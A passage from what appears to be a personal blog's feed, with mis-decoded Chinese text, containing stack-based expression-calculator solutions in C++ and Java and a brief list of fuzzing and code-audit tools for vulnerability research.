class_">states</span>&#123;</span><br><span class="line">        NUMBER,</span><br><span class="line">        LEFT_PARENTHESE,</span><br><span class="line">        RIGHT_PARENTHESE,</span><br><span class="line">        OP</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ç¼–è¯‘åŸç†è¿™ä¸€å—, ç¬¦å·æ ˆ+è§„çº¦</span></span><br><span class="line">        <span class="type">int</span> p=<span class="number">0</span>,state=<span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack_nums;</span><br><span class="line">        stack_nums.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        vector&lt;<span class="type">char</span>&gt; stack_ops;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="comment">// è‡ªåŠ¨æœºï¼Ÿ</span></span><br><span class="line">        <span class="keyword">while</span>(p&lt;s.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;reading: %c\n&quot;</span>,s[p]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isdigit</span>(s[p])) state=NUMBER;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;(&#x27;</span>) state=LEFT_PARENTHESE;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;)&#x27;</span>) state=RIGHT_PARENTHESE;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[p]==<span class="string">&#x27;+&#x27;</span> || s[p] == <span class="string">&#x27;-&#x27;</span>) state=OP;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;recognizing space\n&quot;</span>);</span><br><span class="line">                p++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(state)&#123;</span><br><span class="line">                <span class="keyword">case</span> NUMBER:&#123;</span><br><span class="line">                    <span class="comment">// æ£€æŸ¥ç¬¦å·æ ˆ</span></span><br><span class="line">                    <span class="type">long</span> num=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (p &lt; s.<span class="built_in">length</span>() &amp;&amp; s[p] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[p] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                        num = num * <span class="number">10</span> + s[p] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                        p++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;num: %ld\n&quot;</span>,num);</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(num);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;stack_nums.back():%d\n&quot;</span>,stack_nums.<span class="built_in">back</span>());</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;stack_ops.back(): %c\n&quot;</span>,stack_ops.<span class="built_in">back</span>());</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+num);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x-num);</span><br><span class="line">                    &#125;                   </span><br><span class="line">                    <span class="keyword">else</span> stack_nums.<span class="built_in">push_back</span>(num);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> LEFT_PARENTHESE:</span><br><span class="line">                    stack_ops.<span class="built_in">push_back</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">                    p++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> RIGHT_PARENTHESE:</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+y);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(y-x);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;now it shoud be (: %c\n&quot;</span>,stack_ops.<span class="built_in">back</span>());</span><br><span class="line">                    stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                    p++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> OP:</span><br><span class="line">                    stack_ops.<span class="built_in">push_back</span>(s[p++]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack_ops.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+y);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(y-x);</span><br><span class="line">                    &#125;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_nums.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é¢˜è§£ä¸­çš„ç±»ä¼¼æ€è·¯çš„æ”¯æŒå„ç§è¿ç®—ç¬¦çš„ç®€å•è§£å’Œé€šè§£ï¼Œè§£å†³æˆ‘ä¸Šé¢æµ‹ä¾‹æŒ‚çš„æ€è·¯ä¹Ÿç®€å•ç²—æš´ï¼Œå°±æ˜¯å¯¹å¯èƒ½çš„æƒ…å†µåšæ›¿æ¢ã€‚å¦å¤–ï¼Œè¿™ä¸ªé¢˜è§£ä¹Ÿä¸æ˜¯è§„çº¦ï¼ŒæŒ‰ç…§è§„çº¦çš„è¯åº”è¯¥æ˜¯æ•°å­—å…¥æ ˆå»åšæ¶ˆé™¤ï¼Œå®ƒæ˜¯åœ¨æ“ä½œå…¥æ ˆçš„æ—¶å€™ç›´æ¥å¯¹æ ˆåšå®Œå…¨è®¡ç®—ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> pos = s.<span class="built_in">find</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (pos != <span class="number">-1</span>) &#123;</span><br><span class="line">            s.<span class="built_in">replace</span>(pos, <span class="number">1</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            pos = s.<span class="built_in">find</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// å­˜æ”¾æ‰€æœ‰çš„æ•°å­—</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        <span class="comment">// ä¸ºäº†é˜²æ­¢ç¬¬ä¸€ä¸ªæ•°ä¸ºè´Ÿæ•°ï¼Œå…ˆå¾€ nums åŠ ä¸ª 0</span></span><br><span class="line">        nums.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// å°†æ‰€æœ‰çš„ç©ºæ ¼å»æ‰</span></span><br><span class="line">        <span class="built_in">replace</span>(s);</span><br><span class="line">        <span class="comment">// å­˜æ”¾æ‰€æœ‰çš„æ“ä½œï¼ŒåŒ…æ‹¬ +/-</span></span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; ops;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                ops.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// è®¡ç®—åˆ°æœ€è¿‘ä¸€ä¸ªå·¦æ‹¬å·ä¸ºæ­¢</span></span><br><span class="line">                <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    <span class="type">char</span> op = ops.<span class="built_in">top</span>();</span><br><span class="line">                    <span class="keyword">if</span>(op != <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        ops.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">                    <span class="type">int</span> cur_num = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> j = i;</span><br><span class="line">                    <span class="comment">// å°†ä» i ä½ç½®å¼€å§‹åé¢çš„è¿ç»­æ•°å­—æ•´ä½“å–å‡ºï¼ŒåŠ å…¥ nums</span></span><br><span class="line">                    <span class="keyword">while</span>(j &lt;n &amp;&amp; <span class="built_in">isdigit</span>(s[j]))</span><br><span class="line">                        cur_num = cur_num*<span class="number">10</span> + (s[j++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    <span class="comment">// æ³¨æ„ä¸Šé¢çš„è®¡ç®—ä¸€å®šè¦æœ‰æ‹¬å·ï¼Œå¦åˆ™æœ‰å¯èƒ½ä¼šæº¢å‡º</span></span><br><span class="line">                    nums.<span class="built_in">push</span>(cur_num);</span><br><span class="line">                    i = j<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (s[i - <span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                        nums.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// æœ‰ä¸€ä¸ªæ–°æ“ä½œè¦å…¥æ ˆæ—¶ï¼Œå…ˆæŠŠæ ˆå†…å¯ä»¥ç®—çš„éƒ½ç®—äº†</span></span><br><span class="line">                    <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>() &amp;&amp; ops.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    ops.<span class="built_in">push</span>(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(stack&lt;<span class="type">int</span>&gt; &amp;nums, stack&lt;<span class="type">char</span>&gt; &amp;ops)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>() &lt; <span class="number">2</span> || ops.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> b = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> a = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">char</span> op = ops.<span class="built_in">top</span>(); ops.<span class="built_in">pop</span>();</span><br><span class="line">        nums.<span class="built_in">push</span>(op == <span class="string">&#x27;+&#x27;</span> ? a+b : a-b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;()&#123;&#123;</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;+&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;*&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;/&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;%&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;^&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">int</span> <span class="title">calculate</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        s = s.<span class="built_in">replaceAll</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">char</span>[] cs = s.<span class="built_in">toCharArray</span>();</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        Deque&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        nums.<span class="built_in">addLast</span>(<span class="number">0</span>);</span><br><span class="line">        Deque&lt;Character&gt; ops = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = cs[i];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">addLast</span>(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ops.<span class="built_in">pollLast</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">isNumber</span>(c)) &#123;</span><br><span class="line">                    <span class="type">int</span> u = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &lt; n &amp;&amp; <span class="built_in">isNumber</span>(cs[j])) u = u * <span class="number">10</span> + (cs[j++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    nums.<span class="built_in">addLast</span>(u);</span><br><span class="line">                    i = j - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (cs[i - <span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span> || cs[i - <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span> || cs[i - <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                        nums.<span class="built_in">addLast</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>() &amp;&amp; ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="type">char</span> prev = ops.<span class="built_in">peekLast</span>();</span><br><span class="line">                        <span class="keyword">if</span> (map.<span class="built_in">get</span>(prev) &gt;= map.<span class="built_in">get</span>(c)) &#123;</span><br><span class="line">                            <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ops.<span class="built_in">addLast</span>(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>() &amp;&amp; ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">peekLast</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(Deque&lt;Integer&gt; nums, Deque&lt;Character&gt; ops)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">isEmpty</span>() || nums.<span class="built_in">size</span>() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (ops.<span class="built_in">isEmpty</span>()) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> b = nums.<span class="built_in">pollLast</span>(), a = nums.<span class="built_in">pollLast</span>();</span><br><span class="line">        <span class="type">char</span> op = ops.<span class="built_in">pollLast</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">            ans = a + b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            ans = a - b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            ans = a * b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            ans = a / b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;^&#x27;</span>) &#123;</span><br><span class="line">            ans = (<span class="type">int</span>)Math.<span class="built_in">pow</span>(a, b);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">            ans = a % b;</span><br><span class="line">        &#125;</span><br><span class="line">        nums.<span class="built_in">addLast</span>(ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">boolean <span class="title">isNumber</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Character.<span class="built_in">isDigit</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>é“¾è¡¨</h1><p>kä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;lcçš„è¾“å…¥ä¼ å¼•ç”¨ï¼Œå¹¶ä¸”æ— éœ€è‡ªå·±è®¾è®¡è¾“å…¥è¾“å‡ºæ ¼å¼ï¼Œåªéœ€è¦å®ç°æ ¸å¿ƒå‡½æ•°å³å¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è€ƒè™‘åœ¨æ¯ä¸ªæ–¹å‘ä¸Šéƒ½åš1-2é“é¢˜ã€‚&lt;/p&gt;
&lt;h1&gt;æ•°ç»„æ“ä½œ&lt;/h1&gt;
&lt;p&gt;1-3ï¼šæ•°ç»„æ“ä½œï¼ŒåŒæŒ‡é’ˆä¸ºä¸»ï¼ŒC++ä¸Šå­¦æœŸè€ƒå®Œcspå·²ç»æ‰‹</summary>
      
    
    
    
    
    <category term="ç®—æ³•" scheme="https://zjw1nd.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æŒ–æ˜å…¥é—¨ï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
    <link href="https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-03-28T09:10:24.000Z</published>
    <updated>2025-04-30T07:44:09.022Z</updated>
    
    <content type="html"><![CDATA[<h1>Fuzz</h1><p>Syzkaller å„ç§å†…æ ¸fuzz<br>afl++<br>libfuzzer</p><h1>è‡ªåŠ¨åŒ–ï¼ˆé™æ€ï¼‰</h1><p>Ghidra10.1.2 binabsinspectoræ’ä»¶ï¼Œç§‘æ©çš„</p><h1>Webæ¼æ‰«</h1><p>msf</p><h1>ä»£ç å®¡è®¡</h1><p>Fortify<br>CodeQL</p><h1>æ•°æ®åº“</h1><p>å‚è€ƒgithub starå†…å®¹ç°åœºæœç´¢</p><p>Squirrel C++æ•°ä¸‡è¡Œï¼ˆï¼‰<br>sqlfuzzâ€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Fuzz&lt;/h1&gt;
&lt;p&gt;Syzkaller å„ç§å†…æ ¸fuzz&lt;br&gt;
afl++&lt;br&gt;
libfuzzer&lt;/p&gt;
&lt;h1&gt;è‡ªåŠ¨åŒ–ï¼ˆé™æ€ï¼‰&lt;/h1&gt;
&lt;p&gt;Ghidra10.1.2 binabsinspectoræ’ä»¶ï¼Œç§‘æ©çš„&lt;/p&gt;
&lt;h1&gt;Webæ¼æ‰«&lt;/h1&gt;
&lt;p</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="fuzz" scheme="https://zjw1nd.github.io/tags/fuzz/"/>
    
    <category term="exploit" scheme="https://zjw1nd.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>å†…æ ¸fuzzing--Syzkalleråˆæ¢</title>
    <link href="https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/"/>
